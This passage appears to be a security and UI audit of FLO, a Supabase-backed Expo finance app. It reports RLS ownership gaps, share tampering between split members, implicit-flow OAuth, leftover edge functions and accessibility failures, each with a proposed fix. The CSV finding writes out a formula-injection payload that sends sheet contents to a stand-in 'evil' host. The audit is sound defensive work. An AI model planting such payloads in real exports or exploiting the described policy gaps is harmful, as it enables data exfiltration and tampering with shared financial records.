**Problem:** INSERT policies on `transactions`, `plans`, `budgets`, and `splits` check only `auth.uid() = user_id`. They never check that `account_id`, `category_id`, `plan_id`, or `transfer_account_id` belong to the caller. FKs `transactions_account_id_fkey`, `plans_account_id_fkey`, and `budgets_account_id_fkey` have no ON DELETE action, so they default to RESTRICT. `splits_read` exposes `splits.account_id` (the organizer's account UUID) to every member. A member can insert a transaction with `account_id = <organizer's account>`. The organizer can then no longer delete that account, and `delete_current_user()` fails. That cascade goes `auth.users → accounts`, which is blocked by the attacker's transaction row. This breaks the Play-mandated account deletion. The same pattern lets anyone attach rows to foreign `category_id` or `plan_id` values they learn.

**Change:** Add ownership checks to the WITH CHECK clauses, for example on transactions:
`with check ((select auth.uid()) = user_id and exists (select 1 from accounts a where a.id = account_id and a.user_id = (select auth.uid())) and (category_id is null or exists (select 1 from categories c where c.id = category_id and c.user_id = (select auth.uid()))) and (plan_id is null or exists (...plans...)) and (transfer_account_id is null or exists (...accounts...)))`.
Do the same on the UPDATE policies (which currently have no WITH CHECK), and on `plans`, `budgets`, `bills.category_id`, `splits.account_id`, and `splits.plan_id`. Stop exposing `account_id` to non-owners. For example, members can read splits through a column-limited view, or the app can keep `account_id` only on the organizer side.

**Priority rationale:** Exploitable by any split member who knows the documented API. The impact is denial of account deletion plus data pollution, not data disclosure.

#### [P1] Any split member can tamper with other people's entries through `split_entry_shares`

**Problem:** `split_entry_shares_insert` WITH CHECK is `auth.uid() = user_id AND EXISTS(entry visible)`. Any member can insert a share row on **someone else's** entry, with an arbitrary `member_id` (even a member of a different split) and an arbitrary amount. `split_entry_shares_update` and `split_entry_shares_delete` allow the share's `user_id` to edit their own shares. Shares then no longer sum to the entry (the invariant `save_split_entry` enforces is bypassed), which corrupts balances and settle-up for everyone. `split_settlements_insert` similarly lets any member record a settlement with arbitrary `from_member_id`/`to_member_id`, and nothing checks that those members belong to `split_id`. The same is true of `split_entries.payer_member_id`.

**Change:** Allow share writes only from the entry's owner or the organizer: `with check (exists (select 1 from split_entries e where e.id = entry_id and (e.user_id = (select auth.uid()) or split_role(e.split_id)='organizer')))`. Add a trigger (or composite FK `(split_id, member_id)`) that checks `member_id`, `payer_member_id`, and `from_/to_member_id` belong to the same split. Ideally, revoke direct INSERT/UPDATE/DELETE on `split_entry_shares` from `authenticated` and write only through `save_split_entry`.

**Priority rationale:** Any member can do it. It is an integrity attack on a shared money record, not a data leak.

#### [P1] Google OAuth uses the implicit flow, which returns tokens through a custom-scheme redirect

**Problem:** `lib/supabase.js:63-82` leaves `flowType` at implicit, and `lib/AuthContext.js:117-151` reads `access_token`/`refresh_token` from the `flo://` redirect fragment and calls `setSession`. Any app on the device can declare `<data android:scheme="flo"/>`, receive the redirect (or race for it), and capture a **refresh token**, which means a persistent account takeover. `00-index.md` "Security Audit (2026-07-11)" still says "Google OAuth uses PKCE", which is now false.

**Change:** Switch to `flowType: 'pkce'`. The stated blocker was the missing `crypto.subtle`. Supply SHA-256 with `expo-crypto` (`Crypto.digestStringAsync`), either through a small `crypto.subtle.digest` polyfill or by generating verifier/challenge yourself with Supabase's `signInWithOAuth` + `exchangeCodeForSession`. Even "plain" PKCE is better than implicit here, because an intercepted code is useless without the verifier held in-process. Add Android App Links (an https redirect with `autoVerify`) for the auth callback, and restrict Supabase Auth's redirect allow-list to exactly that URL. Correct the 00-index note.

**Priority rationale:** It needs a malicious app on the victim's device, but the payoff is a long-lived refresh token for a finance app.

#### [P1] Removed AI edge functions are still deployed and ACTIVE (confirmed)

**Problem:** `list_edge_functions` shows `ai-interpret` v4 (Gemini, `GEMINI_API_KEY`) and `ai-report-summary` v6 (OpenRouter, `OPENROUTER_API_KEY`), both ACTIVE with `verify_jwt: true`, although both are gone from the repo. Both read `ai_usage`, which no longer exists. `ai-interpret` currently fails with a 500 at the cap check, and `ai-report-summary` fails closed. Both still gate on `entitlements.is_pro` first. `ai-interpret` honours an `AI_ALLOW_ALL` env bypass.

**Change:** Run `supabase functions delete ai-interpret` and `supabase functions delete ai-report-summary`, then `supabase secrets unset GEMINI_API_KEY OPENROUTER_API_KEY AI_ALLOW_ALL` and revoke those keys at Google and OpenRouter.

**Priority rationale:** Not exploitable today, because of the missing table and the Pro gate. It is dead attack surface holding live third-party API keys, against the standing no-AI rule.

#### [P1] Leaked-password protection disabled; password policy is server-default only (confirmed)

**Problem:** Advisor `auth_leaked_password_protection`. `app/sign-in.js:68-80` has no client-side length or strength rule, so the server default (6 chars) applies. Email confirmation, OTP expiry, and auth rate limits cannot be read through the MCP.

**Change:** In Dashboard → Authentication, enable leaked-password protection, set the minimum length to at least 8 with character requirements, confirm "Confirm email" is ON, keep the default auth rate limits (or tighten sign-in and sign-up), and enable CAPTCHA on sign-up before launch. Mirror the minimum length in the sign-up form.

**Priority rationale:** Credential stuffing against weak or reused passwords is the most likely real-world attack on a consumer finance app.

---

#### [P2] CSV formula injection in split export (cross-user input)

**Problem:** `lib/export.js:16-23` `csvEscape` quotes only `" , \r \n`. It does not neutralise cells that start with `= + - @ \t \r`. `buildSplitCsv` (`lib/export.js:74-162`) writes `split_entries.description`, `split_members.display_name`, and settlement notes, which are typed by **other members**. A member who sets a description such as `=HYPERLINK("https://evil/?"&A1,"Click")` gets it executed when the organizer opens the CSV in Excel or Sheets. `buildTransactionsCsv` has the same gap, though there the input is only the user's own.

**Change:** In `csvEscape`, for text (not numeric) cells: `if (/^[=+\-@\t\r]/.test(str)) str = "'" + str;` and then apply the existing quoting. Keep numeric amount cells as raw numbers, but escape only string values.

**Priority rationale:** Needs another member's input plus the victim opening the file in a spreadsheet. The impact is phishing or exfiltration of the sheet's contents.

#### [P2] Unused and sensitive Android permissions in the release manifest

**Problem:** The merged release manifest declares `CAMERA` (from `expo-image-picker`; no `launchCameraAsync` anywhere in `app/`, `components/`, `lib/`, or `hooks/`), `READ_EXTERNAL_STORAGE`/`WRITE_EXTERNAL_STORAGE` (not needed for the Android 13+ photo picker), and `USE_BIOMETRIC`/`USE_FINGERPRINT` (from `expo-secure-store`, unused). Each one is a Play Data-safety and review item.

**Change:** In `app.json`, set `expo-image-picker` `"cameraPermission": false`, and add `android.permission.CAMERA`, `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, `USE_BIOMETRIC`, and `USE_FINGERPRINT` to `android.blockedPermissions`. First verify on a device that avatar picking still works with the system photo picker. Set `expo-secure-store` `"configureAndroidBackup": true` (already effectively on). Re-check the merged manifest after prebuild.

**Priority rationale:** Not directly exploitable. It is review risk and least privilege.

#### [P2] `android.package` is still `com.anonymous.flo`

**Problem:** `app.json` `android.package`, `google-services.json` `package_name`, and the native class names (`com.anonymous.flo.detect.*`) all use it. A Play package name is permanent after the first upload.

**Change:** Pick the final reverse-DNS id before the first upload, regenerate `google-services.json` for it in Firebase, and re-prebuild.

**Priority rationale:** Not a vulnerability. It is irreversible once published and looks like a sample app.

#### [P2] Firebase config committed with an unrestricted-looking API key

**Problem:** `google-services.json` is tracked in git (`api_key.current_key AIzaSy…`, project `flo26-7de68`). The key is designed to ship in the APK, so committing it is not a leak in itself. But if the key is not restricted, anyone can use it against other Firebase or Google APIs on that project.

**Change:** In Google Cloud Console, restrict the key to Android apps (package plus release SHA-1) and to only the FCM APIs. Optionally move the file to an EAS file secret (`googleServicesFile: process.env.GOOGLE_SERVICES_JSON`) and untrack it.

**Priority rationale:** Low impact if FCM-only. The risk is quota abuse or misuse of other enabled APIs.

---

#### [P3] Advisor WARNs: SECURITY DEFINER RPCs callable by `authenticated` (reviewed, bodies OK)

**Problem:** These SECURITY DEFINER functions are callable by `authenticated`: `claim_push_token`, `delete_current_user`, `join_split`, `preview_split_invite`, `split_role`. All have `search_path=public` pinned, none builds dynamic SQL, and each one derives identity from `auth.uid()`, never from a parameter. Residual issues:
- `claim_push_token(p_token)` lets any user take over any Expo push token string they know. The victim's device then receives the attacker's reminder pushes and stops getting its own.
- `split_role(uuid)` acts as an oracle (it returns your role for any split id). That is harmless on its own.
- `preview_split_invite` returns `split_id`, which feeds the P0 above.
- None of them grants EXECUTE to `anon`, which is correct.

**Change:** Pin the schema-qualified path `search_path = ''` and qualify table names (`public.push_tokens`, and so on). Validate in `claim_push_token` that the token matches `^ExponentPushToken\[.+\]$`. Drop `split_id` from the preview payload once the P0 is fixed; the client can use the id that `join_split` returns. Keep these functions as SECURITY DEFINER, which the design needs.

**Priority rationale:** Low. The bodies are sound.

#### [P3] Invite codes are minted client-side with no server bounds on TTL or format

**Problem:** `lib/splits.js:234-241` produces 22 base36 chars from 16 CSPRNG bytes (about 88+ bits, so not guessable). However, the server accepts any 8–24 char `code` and any `expires_at` (`split_invites_code_check` only checks length). An organizer, or a self-promoted "organizer" (see the P0), can mint short or never-expiring codes.

**Change:** Generate codes in a SECURITY INVOKER RPC or a column default (`encode(gen_random_bytes(16),'hex')`), and add `check (expires_at <= created_at + interval '30 days')`.

**Priority rationale:** Brute force is infeasible today. This is defence-in-depth.

#### [P3] `pg_net` in `public` schema (confirmed)

**Problem:** Advisor `extension_in_public`.

**Change:** `drop extension pg_net; create extension pg_net schema extensions;` in a maintenance window. Re-point the send-push cron job (`net.http_post` is already schema-qualified as `net`, so check the cron SQL).

**Priority rationale:** Lint-level only. It adds functions to the exposed schema namespace.

#### [P3] Over-broad table grants and `{public}`-role policies

**Problem:** `anon` and `authenticated` hold `DELETE, INSERT, SELECT, TRUNCATE, TRIGGER, REFERENCES, UPDATE` on every public table and view (Supabase default). All policies use role `{public}`. RLS blocks anon today because `auth.uid()` is null. `TRUNCATE` bypasses RLS, but PostgREST cannot issue it.

**Change:** `revoke all on all tables in schema public from anon;` (the app has no anon reads). `revoke truncate, trigger, references on all tables in schema public from authenticated;`. Change policies `to authenticated`. Revoke INSERT/UPDATE/DELETE on the `v_*` views.

**Priority rationale:** Hardening. There is no current path to exploit it.

#### [P3] Self-awarded rewards: `reward_events` is fully client-writable

**Problem:** Policy `Users manage own reward_events` (ALL, own `user_id`) lets a user insert arbitrary `coins`, `xp`, and `freezes`, and `v_reward_balances` sums them. Coins unlock card themes in the shop, and freezes protect streaks.

**Change:** Accept this if the rewards stay single-player and cosmetic. If coins ever gate anything paid or social, move awards to SECURITY DEFINER RPCs with server-side rules and drop client INSERT/UPDATE.

**Priority rationale:** Only self-cheating today.

#### [P3] Storage: `avatars` has no size or MIME limit; orphan `receipts` policies

**Problem:** `storage.buckets` `avatars` has `public=false` and `file_size_limit=null`, `allowed_mime_types=null`. The four `storage.objects` policies "Users … own receipts" are left over from the removed AI receipt scan; the bucket no longer exists.

**Change:** `update storage.buckets set file_size_limit = 2097152, allowed_mime_types = '{image/jpeg,image/png,image/webp}' where id='avatars';` and drop the three receipts policies.

**Priority rationale:** Without a limit, users can store arbitrarily large files in their own folder (cost abuse). The orphan policies are clutter.

#### [P3] Exported third-party activity `com.canhub.cropper.CropImageActivity`

**Problem:** `android:exported="true"` in the merged manifest (from the `expo-image-picker` crop dependency). Other apps can launch it with crafted URIs.

**Change:** Add a manifest override through a config plugin, `<activity android:name="com.canhub.cropper.CropImageActivity" android:exported="false" tools:replace="android:exported"/>`, or turn off editing (`allowsEditing:false`) if cropping is not used.

**Priority rationale:** Low. There are known file-URI issues in some cropper versions, and it needs a malicious local app.

#### [P3] JVM crash log committed

**Problem:** `hs_err_pid5576.log` is tracked. It holds a developer machine's `USERNAME`, `PATH`, and local tool paths.

**Change:** `git rm --cached hs_err_pid5576.log` and add `hs_err_pid*.log` to `.gitignore`.

**Priority rationale:** Minor information disclosure.

---

### Verified OK

- **send-push**: v9 deployed with `verify_jwt: true`. `get_send_push_cron_secret()` is SECURITY DEFINER, `search_path=''`, and EXECUTE is granted to `service_role` only. This matches the fix made today.
- **RLS**: enabled on all 19 tables. Single-owner tables (`accounts`, `bills`, `budgets`, `categories`, `plans`, `transactions`, `push_tokens`, `split_people`, `reward_events`) are scoped by `auth.uid() = user_id`. UPDATE policies without WITH CHECK fall back to USING, so `user_id` cannot be reassigned to another user (the FK issue above is separate).
- **Read-only to clients**: `entitlements` (SELECT only, so `is_pro` can't be self-granted), `reminder_sends` (SELECT only), and `profiles` (SELECT/UPDATE own row, no INSERT/DELETE; it has no privilege columns).
- **Views**: all four (`v_budgets_with_spent`, `v_global_summary`, `v_plans_with_totals`, `v_reward_balances`) have `security_invoker=true`.
- **Defaults and cascades**: `user_id` defaults to `auth.uid()` everywhere relevant. User-owned tables cascade from `auth.users`. `split_members.member_user_id` is ON DELETE SET NULL, so the ghost row stays.
- **Function bodies**: `delete_current_user` (null-uid check, deletes only `auth.uid()`), `handle_new_user`, `handle_user_delete` (EXECUTE service_role only), `join_split` (checks expiry and revocation, is idempotent, and the claim is limited to an unclaimed non-self ghost in the same split), `preview_split_invite` (no phone, amounts or entry text), and `save_split_entry` (SECURITY INVOKER, so RLS applies). None uses dynamic SQL.
- **Invites**: `split_invites` are readable and writable by the organizer only. Expiry is NOT NULL and enforced in both RPCs. Codes come from a CSPRNG.
- **Storage**: `avatars` is private, and all four policies are scoped to `foldername(name)[1] = auth.uid()`. The account-deletion trigger removes avatar objects.
- **Session storage**: `lib/supabase.js` uses LargeSecureStore (an AES-256-CTR blob in AsyncStorage, with a fresh random key per write held in SecureStore). The backup rules (`secure_store_backup_rules` / `secure_store_data_extraction_rules`) exclude SecureStore, so a restored backup can't decrypt the session.
- **AsyncStorage**: holds only UI flags, settings mirrors, the active account id, the onboarding draft, and the pending invite code. No tokens or financial records.
- **Secrets**: `.env` is gitignored and never committed. The client uses only `EXPO_PUBLIC_SUPABASE_URL`/`ANON_KEY` (public by design). The EAS projectId in `app.json` is not a secret.
- **Release manifest**: no `usesCleartextTraffic` and no `debuggable`. File providers are not exported. The FCM receiver is permission-protected. `MainActivity` is exported only for the launcher, the `flo://` VIEW intent, and the `text/*` SEND intent. `SYSTEM_ALERT_WINDOW` and `RECORD_AUDIO` are stripped.
- **Share-intent input**: `lib/smsParser.js` caps input at 2000 chars and amounts at ₹1 crore. Parsed values only prefill a sheet that the user confirms.
- **Deep links**: `flo://join/<code>` shows a preview and needs an explicit tap to join, so there is no auto-join. The code is passed to RPCs as a bound parameter.
- **PDF export**: every user string in `buildSplitHtml` passes through `esc()`, which escapes `& < > "`. Filenames are sanitised in `exportFilename`.
- **Logging**: `console.*` calls log only error messages, with no tokens, amounts or PII.

---

## 4. UI and design language

> Source: UI audit (code + emulator screenshots). Where it says to remove the streak chip, this doc keeps one quiet streak indicator (see the decisions table at the top).

Read-only audit, 2026-10-18. Sources: `theme/*`, `lib/cardThemes.js`, `app/(tabs)/*`, `app/{settings,shop,personalize}.js`, `components/*`, plus emulator screenshots (Home, Menu, Shop Cards, Shop General, Analytics) on the signed-in test account with an empty ledger. Measured against the Expo `expo-design-system` skill (audit and native-slop references), `expo-native-ui` and `expo-ui`.

### Verdict in one paragraph

FLO's surface area is a game wrapped around a ledger. The default Home screen is a good example. Before you have logged a single rupee, the first row shows **coins 1,000, freezes 2, level 1, a streak of 0, Trophy, Shop and Bell**: seven pieces of gamification chrome against one notification bell. The money (₹0) only appears under that row and a greeting. On top of that sit **23 accents × 2 modes × 49 card themes, which is 2,254 possible looks**, and every new screen has to hold up in all of them. The UI is not ugly. The base (near-black, off-white and lime, set in Manrope) is coherent. But it has the generic "AI-built fintech" shape: everything sits in a bordered rounded card, the screens use pill segment controls and a floating-pill FAB, the headers are hand-rolled, onboarding is emoji-led, and the whole thing is tied together with a lot of reward animation. Cut the customisation to one look plus system light/dark. Then remove gamification from the money screens and put numbers first.

---

### Inventory: every theming and customisation surface

| Surface | Where | Count | Notes |
|---|---|---|---|
| Accent colours | `theme/themes.js` `ACCENTS` | **23** (7 original + 14 "expanded" + 2 dark-only: Ash, Cream) | Needs a runtime WCAG picker (`pickBrandTextColor`) plus a mode-lock fallback just to stay legible |
| Modes | `theme/themes.js` `MODES` | **2** (light, dark) | **No "follow system" option.** `app.json` has `userInterfaceStyle: "light"`, and nothing in the repo calls `useColorScheme`/`Appearance` |
| Card themes (hero card skins) | `lib/cardThemes.js` (1,239 lines) | **49 live**: free 2, common 6, rare 7, epic 13, legendary 7, milestone 4, achievement 6, rank 4 | 28 can be bought with coins and 21 are earned. There are 3 render types (solid, linear gradient, pattern) with 6 pattern kinds, drawn by `CardThemeSurface.js` |
| Seasonal themes | `lib/cardThemes.js` ~L889–930 | **1 held back** (Rainbow, commented out) | There is no availability-window mechanism; it is a plan in a comment |
| Rank-gated themes | `cardThemes.js` `tier:"rank"` + `RANK_THEME_GRANTS` in `lib/rewards.js` | **4** | Each one ties a visual asset to the XP ladder |
| Shop | `app/shop.js` (974 lines) | 2 tabs: Cards, and General (6 **real-money coin packs, ₹49–₹999**, plus streak freezes) | See P0-3 |
| Personalize hub | `app/personalize.js` (355 lines) | Preview, Appearance, a 23-swatch accent strip, a card grid and an Equip footer | Reached from Settings |
| Theme sync plumbing | `ThemeContext.js`, `ThemeProfileSync` in `_layout.js`, AsyncStorage plus the profile table | 2 persistence paths | |

**Combinatorial cost:** 23 × 2 × 49 = **2,254** combinations of hero card, accent and mode. Nobody can QA that matrix.

### Themes: keep / cut / merge

| Item | Decision | Why |
|---|---|---|
| Light mode | **Keep** | Base look |
| Dark mode | **Keep, and add "System" as the default** | It is table stakes and is already built. Set `userInterfaceStyle: "automatic"` |
| Lime (the brand accent) | **Keep as the only brand colour**, but stop using it as text or icons on light surfaces (1.57:1 on white) | It is the identity, but it only works as a fill or on dark |
| Accents: Ocean, Violet, Amber, Teal, Pink, Hot Rod | **Cut**, or keep at most 3 tested ones (e.g. Lime, Ocean, Slate) if the owner insists | 13 of the 23 accents fall below 3:1 against white. Each accent multiplies QA |
| The 14 "expanded" accents (Crimson…Slate) | **Cut** | They were added to match card themes (`themes.js` comment). Crimson, Coral and Hot Rod collide with `danger` red. Emerald and Lagoon collide with income green |
| Ash and Cream (dark-only) | **Cut** | They need special lock and fallback code to exist at all |
| Card themes, 2 free (Ink, Lime Flood) | **Keep Ink only.** The hero becomes a plain emphasis surface | Lime Flood duplicates the accent |
| Card themes, 26 coin-buyable (common, rare, epic) | **Cut** | The shop and economy exist mainly to sell these. Gradient and pattern skins under the balance hurt numeric legibility |
| Card themes, 21 earned (legendary, milestone, achievement, rank) | **Cut, or fold into rewards as at most 3–4 badges/skins** if gamification survives check 1/2 | Rewards should not change how money reads |
| Seasonal (Rainbow) | **Cut** | It is unbuilt and needs a new availability system |
| Personalize hub | **Merge into Settings → Appearance**: one segmented control (System / Light / Dark) | That leaves nothing else to personalise |
| Shop "Cards" tab | **Cut** | Nothing is left to sell |

---

### Findings

#### [P0] Gamification chrome dominates the money screens

**Problem:** On Home (`app/(tabs)/index.js` L173–257), the header row holds a 3-counter chip (coins, freezes, rank level), the streak chip, and Trophy, Shop and Bell buttons. That is 5 tap targets, and 4 of them are gamification. The screenshot of a fresh account reads "1,000 · 2 · 1 · 🔥0 · trophy · bag · bell" before any money appears. Below that: a greeting ("One day left, Tester" is ambiguous; it actually means the summary period), the hero carousel, `ReportReadyCard`, `TodayCard` (the close-the-day ritual), a chart, bills and recent transactions. That is up to 7 stacked blocks. Home imports 9 gamification symbols (`useRewards`, `useTrophies`, `RANK_BADGE_ART`, `useRewardsHistorySheet`, `useCardThemes`, `useRewardBurst`, `takePendingLoginReward`, the coin, freeze and flame PNGs). Around it sit 9 celebration components (`Confetti`, `PartyPopper`, `RewardBurst`, `RankUpCelebration`, `StreakCelebration`, `MilestoneSpinWheel`, `TrophyToast`, `OnboardingMascot`, `FreezePrompt`) and 3 more screens (`streak.js` 814, `trophies.js` 494, `shop.js` 974 lines).
**Change:** Home header becomes the account switcher on the left and Bell on the right. Remove the coins, freeze and level chip, the Trophy and Shop buttons, and the streak chip. At most, keep a quiet "logged today ✓" state inside the Today block. Order Home as: balance and month spend (numbers), then this month vs budget, then recent transactions. Drop the 7-day chart from Home, because Analytics owns charts. Drop `TodayCard` or merge it into an empty state. Show `ReportReadyCard` only as a dismissible inline banner.
**Priority rationale:** This is the first screen, and it currently tells the user FLO is a game. A trustworthy money app cannot launch like that.

#### [P0] 2,254-combination theming system: cut to one look plus system light/dark

**Problem:** See the inventory. The 23 accents need runtime contrast picking (`pickBrandTextColor`, `brandTextMuted`, `brandOverlay`) and a mode-lock fallback (`accentSupportsMode`). `themes.js` comments document several rounds of "hard to read" fixes (Ocean re-darkened twice, and it is still 4.03:1). **13 of 23 accents fail 3:1 against white**, and `colors.brand` is used directly as a text or icon colour in **27 places** (`grep "color: colors.brand"`), so those break on light mode. Crimson, Coral and Hot Rod sit in the same hue band as `danger` (over budget). Emerald and Lagoon sit in the same band as `income`. In those cases the accent hides semantic colour. 49 card skins sit directly under the balance number. The app ignores the OS theme (`userInterfaceStyle: "light"`, no `useColorScheme`).
**Change:** Delete `ACCENTS` down to one brand accent (plus at most 2 tested ones if wanted). Delete Personalize, the Shop Cards tab, `CardThemeSurface`, the card-theme catalogue and `ThemeProfileSync`'s accent sync. Add `System / Light / Dark` with System as the default (`userInterfaceStyle: "automatic"`). Hero = `Card dark` (emphasisBg), with nothing else.
**Priority rationale:** Every screen, bug fix and future redesign pays for this matrix, and the contrast failures can be reproduced today.

#### [P0] Real-money coin packs for cosmetics in a finance app

**Problem:** Shop → General (screenshot) sells 6 coin packs (500 coins ₹49 … 20,000 coins ₹999) with treasure-chest art and a "POPULAR" tag. In practice it is a loot-store pattern inside an expense tracker. It also needs Play Billing and IAP compliance, and it competes with Pro (`lib/pro.js`) as a second monetisation path.
**Change:** Remove coin packs. If gamification stays at all, coins can only be earned and never bought. Pro stays the only paid thing.
**Priority rationale:** It undermines trust, conflicts with Pro, and adds store-review risk. (Flag to the monetisation check too.)

#### [P0] Accessibility is effectively absent

**Problem (verified):** There are **279 `<Pressable>`** and exactly **1** `accessibilityRole` (`components/Switch.js:47`). There are **zero** `accessibilityLabel`s. Icon-only buttons (Trophy, Shop, Bell, back, close X, download, the + FAB) announce nothing to TalkBack. The `styles.backButton` copy appears in **18 files**, at 40×40 with no hitSlop (Android minimum is 48dp). There are only 12 `hitSlop`s in total. Contrast: tab-bar inactive labels `mutedLight #b0b3aa` on white = **2.13:1**. `muted #8a8e84` on bg = 3.11:1 and is used as a text colour **236 times**. `chevron` = 1.71:1. `warn #C98A12` on white = 2.95:1. Analytics' income vs expense legend uses lime vs olive (`#BBDC12` vs `#7B8B0C`, **2.41:1 between them**), which deuteranopes can't tell apart. Type: the most-used sizes are 12, 13, 14 and 11 px (`fontSize.sm` ×125, `base` ×113, `md` ×104, `xs` ×77). Body text is small, and nothing has been tested at 1.3× or larger system font (fixed-height chips such as the header `Skeleton height={44}` and the 72-px tab bar will clip).
**Change:** Build one `IconButton` component (48dp target, required `accessibilityLabel`, pressed state) and one `BackButton`, or better, use native Stack headers (see P1). Give every Pressable role and label props through the shared components. Raise the muted text token to at least 4.5:1 (e.g. `#6b6f66` = mutedDarker becomes the default muted). Distinguish income and expense by hue and by shape or label, not by lime vs olive. Set the body text floor to 14–15 and test at the largest font scale.
**Priority rationale:** Play pre-launch reports flag the touch-target and label issues. And this is basic quality.

#### [P1] Hand-rolled navigation chrome everywhere (native-slop #11, #5, #2)

**Problem:** The root Stack sets `headerShown: false` (`app/_layout.js:444`). Every pushed screen rebuilds a back button and title by hand (18 files). The tab bar is a custom component (`components/TabBar.js`) with a raised lime "+" pill in the middle. Menu is a fake tab that opens a sheet. Sheets have both a grab handle and an X button (Menu screenshot).
**Change:** Use native Stack headers (title, back and system back gesture come free). Use a standard Material bottom bar with 3–4 destinations. Make "Add" a proper FAB on Home and Transactions, or keep the centre button but drop the fake "Menu" tab. Move Plans, Splits, Budgets, Bills and Reports into a "More" screen or into the destinations they belong to (Budgets → Analytics, Bills → Home). Remove the X on swipe-dismissable sheets.
**Priority rationale:** It removes 18 copies of the same component and fixes back-gesture and Android idiom issues in one move.

#### [P1] "Everything's a Card" plus wireframe borders (native-slop #7, #9)

**Problem:** `components/Card.js` = radius 22 + **1px border** + 16 padding, and it is used for every block: the hero, chart, bill list, transaction list, empty state, Analytics KPI, Settings rows (6 `<Card>` groups in `settings.js`). With radius 22–46 (`radii.screen: 46`, `sheet: 32`) and **112 raw `borderRadius` numbers**, nearly every surface is a bubbly bordered blob. Pills appear at three levels on Analytics (Month/Custom segment, then the month stepper pill, then Overview/Transactions/Categories/Budgets chips), which is three stacked navigation controls.
**Change:** Lists become flat grouped rows (hairline separators, no outer border). Keep cards only for the hero and for truly separate objects. Use 3 radii (8/12/16) plus full, and pair them with `borderCurve: 'continuous'`. Analytics gets one period control (a month stepper with "Custom" in a menu) and one view switch.
**Priority rationale:** This is the biggest single driver of the generic, template look.

#### [P1] Settings is a 1,241-line catch-all

**Problem:** `app/settings.js` holds profile, currency (with a `CircleDollarSign` dollar icon, in an India-first app), categories, Personalize, Notifications, Reports, Summary Period with a date picker, a variant-gated Transaction Detection debug card (with `Alert.alert` "Last N seen" diagnostics) and an RN `<Modal>`. The Menu sheet also carries Log Out as a peer of Plans and Budgets, and a lime "Upgrade to Pro" banner sits on top.
**Change:** Split it into grouped native-style sections (Account, Preferences, Notifications, Data/export, About). Use `@expo/ui` List/Switch/Picker if moving to SDK 55+; otherwise use one shared `SettingsRow`. Keep the debug detection UI out of release builds. Use a rupee or neutral currency icon (also replace the `$` receipt icon on Bills in the Menu). Move Log Out to the bottom of Settings.
**Priority rationale:** It is one of the most visited secondary screens, and the dollar iconography looks careless in the target market.

#### [P1] Onboarding is emoji-led and long (native-slop #3, #15)

**Problem:** There are 10 intro screens (`app/onboarding/intro/*`: opener, problem, solution, name, age, goal, habit, leak, income, reflection), 11 setup screens and a tour (`onboarding/tour/[step].js`). There are 30 emoji glyphs used as option icons (🌱🚀⚖️🎯🔍🛑🧘📅😅🍔🛍️🤷…). The app's own UI uses lucide icons, so onboarding speaks a different visual language. (Memory notes the owner plans to trim onboarding after the tour ships.)
**Change:** Reduce it to name, currency, first account balance and then Home. Defer budgets and reminders to contextual prompts. Replace emoji with the lucide set.
**Priority rationale:** It is the first impression, and it does not collect data the UI uses (age, "leak").

#### [P1] Hierarchy and data clarity on lists and charts

**Problem:** Recent-transaction rows print the category twice: title = `tx.category?.name`, subtitle = `date · tx.category?.name` (`index.js` ~L405–420). The note or merchant, which is the most identifying field, never shows. The empty charts render meaningless decimal axes (0, 0.3, 0.5, 0.8, 1) on Home and Analytics (screenshots). Home shows a 7D/1M/3M chart that duplicates Analytics. The hero balance at 56px (`amountXl`) uses a grey ₹ glyph, and Income/Expense under it use trend-arrow glyphs that read as stock movement.
**Change:** Row = note (or category) / category · date / amount. When there is no data, show an empty state instead of axes, and use integer currency ticks. Keep one chart, on Analytics.
**Priority rationale:** Numbers-first is the point of the app, and the current rows waste their most important line.

#### [P1] Feedback, motion and dialogs

**Problem (verified):** Pressed-state styling appears in only **8** places, **0** haptics and **0** `boxShadow`. Legacy `shadow*`/`elevation` props appear in 12 lines (`RewardBurst` opacity 0.25 / radius 14 is "shadowboxing"). `FadeIn` appears in 12 files (73 entering hits), and Home fades every block in on each load (native-slop #14). There are 11 RN `<Modal>`s, including two custom centre buy dialogs in `shop.js` and the `TodayCard` dialog (the "Web Modal", #1). There are 22 `Alert.alert` calls, mostly confirmations of destructive actions (fine), but some are diagnostics (`settings.js:264,278`).
**Change:** Give the shared `Pressable` wrappers per-role feedback: rows highlight, buttons dim or scale slightly. Add a light haptic on save and on delete-confirm only. Keep entrance animation for first-time moments only. Move shadows to 2–3 `boxShadow` tokens. Use native sheets or alerts instead of centred custom modals.
**Priority rationale:** Without press feedback the app feels unresponsive, and constant fade-ins make it feel slow.

#### [P2] Token drift

**Problem (verified):** 37 hex literals and 16 `rgba(` in app/components (the earlier scan said 34 and 10; the rgba count includes scrims and the lock scrim `#FFFFFF` in `personalize.js:156`). There are 112 raw `borderRadius` numbers and 20 raw `fontSize` numbers. The type ramp has **14 sizes** (11, 12, 13, 14, 15, 16, 17, 19, 20, 22, 30, 34, 44, 56) and 5 Manrope weights, many of them 1px apart. `spacing` lacks the 32/40/48 section steps, so section gaps equal row gaps (native-slop #12). `tokens.js` `colors` is a light-mode palette that screens still import directly as `staticColors` (e.g. `UPCOMING_BILL_STYLES` in `index.js` pins `staticColors.danger`/`warn`, so dark mode cannot retint).
**Change:** Type ramp of 6 steps (12/14/16/20/28/40) × 3 weights. Spacing adds 32/48. Radii 8/12/16/full. Add `shadows` and `motion` tokens. Ban `staticColors` imports in screens.
**Priority rationale:** It matters but is mechanical, and the redesign should do it once rather than patch it now.

#### [P2] Too many top-level destinations

**Problem:** There are 3 tabs, a fake Menu tab (Plans, Splits, Budgets, Reports, Bills, Settings), 3 header icon destinations (Trophies, Shop, Alerts) and 2 header chips (Rewards history, Streak). That is about 14 places one tap from Home. Budgets appear in Menu, in an Analytics chip and in onboarding. Reports appear in Menu, on `ReportReadyCard` and in a Settings section.
**Change:** Give each concept one home. Plans and Splits are the candidates to cut or hide behind "More" (defer to the feature-scope check).
**Priority rationale:** Navigation sprawl is the visible symptom of the feature sprawl.

#### [P3] Brand assets

**Problem:** Mixed art styles: glossy 3D PNG coins, chests and flames (`assets/general/*`) next to line-weight lucide icons and a flat UI. The mascot (`OnboardingMascot`, "Koban") adds a third style.
**Change:** Once gamification is trimmed, retire the 3D asset set. Keep one icon family (lucide, or Material Symbols on Android) and one logo mark.
**Priority rationale:** It becomes moot once the P0 cuts land.

---

### Design-language recommendation: "Ledger, not game"

A calm, numbers-first money app. Reference points are Monzo, Revolut's "analytics" views, and Apple Wallet. Do not model it on Duolingo.

1. **Numbers first.** On every money screen the largest element is a rupee figure (balance, spent this month, left in budget). Use tabular figures and one display size. Nothing decorative sits above the number.
